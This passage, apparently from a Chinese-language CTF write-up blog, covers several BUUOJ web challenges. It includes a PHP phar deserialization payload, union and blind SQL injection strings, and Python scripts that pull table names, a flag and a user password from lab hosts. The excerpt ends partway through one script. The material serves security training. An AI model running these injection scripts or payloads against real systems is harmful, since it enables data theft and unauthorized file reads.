<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">C1e4r</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$str</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Show</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$str</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">str</span><span class="p">[</span><span class="s1">&#39;str&#39;</span><span class="p">]</span><span class="o">=</span><span class="k">new</span> <span class="nx">Test</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Test</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$params</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">params</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;source&#34;</span> <span class="o">=&gt;</span> <span class="s2">&#34;/var/www/html/f1ag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$o</span><span class="o">=</span><span class="k">new</span> <span class="nx">C1e4r</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$o</span><span class="o">-&gt;</span><span class="na">str</span><span class="o">=</span><span class="k">new</span> <span class="nx">Show</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="o">@</span><span class="nx">unlink</span><span class="p">(</span><span class="s2">&#34;phar.phar&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">//ÁîüÊàêpharÊó∂ÔºåÊñá‰ª∂ÁöÑÂêéÁºÄÂêçÂøÖÈ°ª‰∏∫phar
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$phar</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Phar</span><span class="p">(</span><span class="s2">&#34;phar.phar&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">startBuffering</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="c1">//ËÆæÁΩÆstub
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setStub</span><span class="p">(</span><span class="s1">&#39;GIF89a&#39;</span><span class="o">.</span><span class="s1">&#39;&lt;?php __HALT_COMPILER();?&gt;&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="c1">//Â∞ÜËá™ÂÆö‰πâÁöÑmeta-dataÂ≠òÂÖ•manifestÔºåËøô‰∏™ÊòØÂà©Áî®ÁöÑÈáçÁÇπ
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setMetadata</span><span class="p">(</span><span class="nv">$o</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="c1">//Ê∑ªÂä†Ë¶ÅÂéãÁº©ÁöÑÊñá‰ª∂ÔºåËøô‰∏™Êñá‰ª∂ÂèØ‰ª•‰∏çÂ≠òÂú®Ôºå‰ΩÜËøôÂè•ËØ≠Âè•‰∏çËÉΩÂ∞ë
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">addFromString</span><span class="p">(</span><span class="s2">&#34;test.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;test&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="c1">//Á≠æÂêçËá™Âä®ËÆ°ÁÆó
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">stopBuffering</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err"> 
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>‰∏ä‰º†ÂêéÊü•ÁúãuploadË∑ØÁî±</p>
<p>ÁÑ∂ÂêéÂú®file.phpÈáåÈù¢Êúâfile_existsÂáΩÊï∞ÂèØ‰ª•Ëß¶ÂèëÂèçÂ∫èÂàóÂåñ</p>
<h2 id="october-2019-twice-sql-injection">October 2019 Twice SQL Injection
</h2><p>È¢òÁõÆÂè´‰∫åÊ¨°Ê≥®ÂÖ•</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1&#39; union select database()#
</span></span><span class="line"><span class="cl">1&#39; union select group_concat(table_name)from information_schema.tables
</span></span><span class="line"><span class="cl">where table_schema=database()#
</span></span><span class="line"><span class="cl">1&#39; union select group_concat(column_name)from
</span></span><span class="line"><span class="cl">information_schema.columns where table_name=&#39;flag&#39;#
</span></span><span class="line"><span class="cl">1&#39; union select (select group_concat(flag)from
</span></span><span class="line"><span class="cl">flag)#
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="gyctf2020ezsqli">[GYCTF2020]Ezsqli
</h2><p>Êó†ÂàóÂêçÊ≥®ÂÖ•</p>
<p>ÁàÜË°®</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">logging</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># LOG_FORMAT = &#34;%(lineno)d - %(asctime)s - %(levelname)s - %(message)s&#34;</span>
</span></span><span class="line"><span class="cl"><span class="c1"># logging.basicConfig(level=logging.DEBUG, format=LOG_FORMAT)</span>
</span></span><span class="line"><span class="cl"><span class="n">target</span><span class="o">=</span><span class="s2">&#34;http://1412c496-d04b-49dd-86ec-2e57fd4db8d0.node5.buuoj.cn:81/index.php&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">dataStr</span><span class="o">=</span><span class="s2">&#34;(select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database())&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">binaryTest</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="n">cu</span><span class="p">,</span><span class="n">comparer</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">target</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;id&#34;</span> <span class="p">:</span> <span class="s2">&#34;0^(ascii(substr(</span><span class="si">{}</span><span class="s2">,</span><span class="si">{}</span><span class="s2">,1))</span><span class="si">{comparer}{}</span><span class="s2">)&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">dataStr</span><span class="p">,</span><span class="n">i</span><span class="p">,</span><span class="n">cu</span><span class="p">,</span><span class="n">comparer</span><span class="o">=</span><span class="n">comparer</span><span class="p">)})</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s1">&#39;Nu1L&#39;</span> <span class="ow">in</span> <span class="n">s</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">searchFriends_sqli</span><span class="p">(</span><span class="n">i</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">l</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="mi">255</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span><span class="n">l</span> <span class="o">&lt;=</span> <span class="n">r</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">cu</span> <span class="o">=</span> <span class="p">(</span><span class="n">l</span> <span class="o">+</span> <span class="n">r</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">binaryTest</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">cu</span><span class="p">,</span> <span class="s2">&#34;&lt;&#34;</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">            <span class="n">r</span> <span class="o">=</span> <span class="n">cu</span> <span class="o">-</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="p">(</span><span class="n">binaryTest</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">cu</span><span class="p">,</span> <span class="s2">&#34;&gt;&#34;</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">            <span class="n">l</span> <span class="o">=</span> <span class="n">cu</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="p">(</span><span class="n">cu</span> <span class="o">==</span> <span class="mi">0</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nb">chr</span><span class="p">(</span><span class="n">cu</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;start&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">finres</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">i</span><span class="o">=</span><span class="mi">1</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span><span class="kc">True</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">extracted_char</span> <span class="o">=</span> <span class="n">searchFriends_sqli</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">extracted_char</span> <span class="o">==</span> <span class="kc">None</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="cl">        <span class="n">finres</span> <span class="o">+=</span> <span class="n">extracted_char</span>
</span></span><span class="line"><span class="cl">        <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;(+) ÂΩìÂâçÁªìÊûú:&#34;</span><span class="o">+</span><span class="n">finres</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;(+) ËøêË°åÂÆåÊàê,ÁªìÊûú‰∏∫:&#34;</span><span class="p">,</span> <span class="n">finres</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span><span class="o">==</span><span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÁàÜflag</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://1412c496-d04b-49dd-86ec-2e57fd4db8d0.node5.buuoj.cn:81/index.php&#39;</span>
</span></span><span class="line"><span class="cl"><span class="c1"># give_grandpa_pa_pa_pa</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload_flag</span> <span class="o">=</span> <span class="s1">&#39;1^((1,</span><span class="se">\&#39;</span><span class="si">{}</span><span class="se">\&#39;</span><span class="s1">)&gt;(select * from f1ag_1s_h3r3_hhhhh))&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">100</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.3</span><span class="p">)</span><span class="c1">#ËøôÈáåË¶Åsleep‰∏Ä‰∏ãÔºå‰∏çÁÑ∂Â§™Âø´‰∫Ü‰ºö‰π±Á†ÅÔºåÊú¨‰∫∫ÊµãËØïÂêé0.3Ê≠£Â•ΩËÉΩÂá∫ÁªìÊûú</span>
</span></span><span class="line"><span class="cl">    <span class="n">low</span> <span class="o">=</span> <span class="mi">32</span>
</span></span><span class="line"><span class="cl">    <span class="n">high</span> <span class="o">=</span> <span class="mi">132</span>
</span></span><span class="line"><span class="cl">    <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">low</span> <span class="o">+</span> <span class="n">high</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span><span class="n">low</span> <span class="o">&lt;</span> <span class="n">high</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">k</span> <span class="o">=</span> <span class="n">flag</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">mid</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="n">payload_flag</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">k</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;id&#34;</span><span class="p">:</span> <span class="n">payload</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s1">&#39;Nu1L&#39;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">low</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">high</span> <span class="o">=</span> <span class="n">mid</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">low</span> <span class="o">+</span> <span class="n">high</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">mid</span> <span class="o">==</span> <span class="mi">33</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">break</span>
</span></span><span class="line"><span class="cl">    <span class="n">flag</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">mid</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="o">.</span><span class="n">lower</span><span class="p">())</span>  <span class="c1"># Âõ†‰∏∫Âá∫Êù•ÁöÑflagÊòØÂ§ßÂÜôÔºåËøôËæπÂÖ®ÈÉ®ËΩ¨‰∏∫Â∞èÂÜô</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="o">.</span><span class="n">lower</span><span class="p">())</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="ciscn2019-ÊÄªÂÜ≥Ëµõ-day2-web1easyweb">[CISCN2019 ÊÄªÂÜ≥Ëµõ Day2 Web1]Easyweb
</h2><p>Êúârobots.txtÔºåÊü•Áúãimage.php.bak</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">include</span> <span class="s2">&#34;config.php&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$id</span><span class="o">=</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;id&#34;</span><span class="p">])</span><span class="o">?</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;id&#34;</span><span class="p">]</span><span class="o">:</span><span class="s2">&#34;1&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$path</span><span class="o">=</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;path&#34;</span><span class="p">])</span><span class="o">?</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;path&#34;</span><span class="p">]</span><span class="o">:</span><span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$id</span><span class="o">=</span><span class="nx">addslashes</span><span class="p">(</span><span class="nv">$id</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$path</span><span class="o">=</span><span class="nx">addslashes</span><span class="p">(</span><span class="nv">$path</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$id</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\\</span><span class="s2">0&#34;</span><span class="p">,</span><span class="s2">&#34;%00&#34;</span><span class="p">,</span><span class="s2">&#34;</span><span class="se">\\</span><span class="s2">&#39;&#34;</span><span class="p">,</span><span class="s2">&#34;&#39;&#34;</span><span class="p">),</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nv">$id</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$path</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\\</span><span class="s2">0&#34;</span><span class="p">,</span><span class="s2">&#34;%00&#34;</span><span class="p">,</span><span class="s2">&#34;</span><span class="se">\\</span><span class="s2">&#39;&#34;</span><span class="p">,</span><span class="s2">&#34;&#39;&#34;</span><span class="p">),</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nv">$path</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$result</span><span class="o">=</span><span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$con</span><span class="p">,</span><span class="s2">&#34;select * from images where id=&#39;</span><span class="si">{</span><span class="nv">$id</span><span class="si">}</span><span class="s2">&#39; or path=&#39;</span><span class="si">{</span><span class="nv">$path</span><span class="si">}</span><span class="s2">&#39;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$row</span><span class="o">=</span><span class="nx">mysqli_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span><span class="nx">MYSQLI_ASSOC</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$path</span><span class="o">=</span><span class="s2">&#34;./&#34;</span> <span class="o">.</span> <span class="nv">$row</span><span class="p">[</span><span class="s2">&#34;path&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Content-Type: image/jpeg&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">readfile</span><span class="p">(</span><span class="nv">$path</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Ë¶ÅÂçïÂºïÂè∑Â∞ùËØïÊ≥®ÂÖ•ÔºåËøôÈáåÁúãÂà∞idÂÖàÁªèËøáaddslashesÂáΩÊï∞ËΩ¨‰πâÁÑ∂ÂêéÂÜçË¢´str_replaceÊõøÊç¢‰∏∫Á©∫</p>
<p>Êàë‰ª¨Áõ¥Êé•Âú®idËøôÈáåÁî®<code>\\0</code>ËøôÊ†∑<code>\0</code>‰ºöË¢´ËΩ¨‰πâÊàê<code>\\0</code>ÔºåÁÑ∂ÂêéÂèàË¢´ÊõøÊç¢ÊàêÁ©∫ÔºåÊúÄÂêéÂâ©‰∏™<code>\</code>ÊääÂêéÈù¢ÁöÑÂçïÂºïÂè∑ËΩ¨‰πâ</p>
<p>ÂèØ‰ª•ÁúãÁïåÈù¢ÊúâÊó†<code>JFIF</code>Â≠óÁ¨¶‰∏≤Âà§Êñ≠ÊòØÂê¶ÊúâÂõæÁâá</p>
<p>payload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">image.php?id=\\0&amp;path=or ascii(substring(database(),%s,1))=%s #
</span></span></code></pre></td></tr></table>
</div>
</div><p>Áõ≤Ê≥®</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span>  <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://727bcaec-8c37-47b6-8428-161fcbeeeb42.node5.buuoj.cn:81/image.php?id=</span><span class="se">\\</span><span class="s2">0&amp;path=&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34; or ascii(substr((select password from users),</span><span class="si">{}</span><span class="s2">,1))&gt;</span><span class="si">{}</span><span class="s2">%23&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">100</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">high</span> <span class="o">=</span> <span class="mi">127</span>
</span></span><span class="line"><span class="cl">    <span class="n">low</span> <span class="o">=</span> <span class="mi">32</span>
</span></span><span class="line"><span class="cl">    <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">low</span><span class="o">+</span><span class="n">high</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># print(mid)</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span><span class="p">(</span><span class="n">high</span><span class="o">&gt;</span><span class="n">low</span><span class="p">):</span>
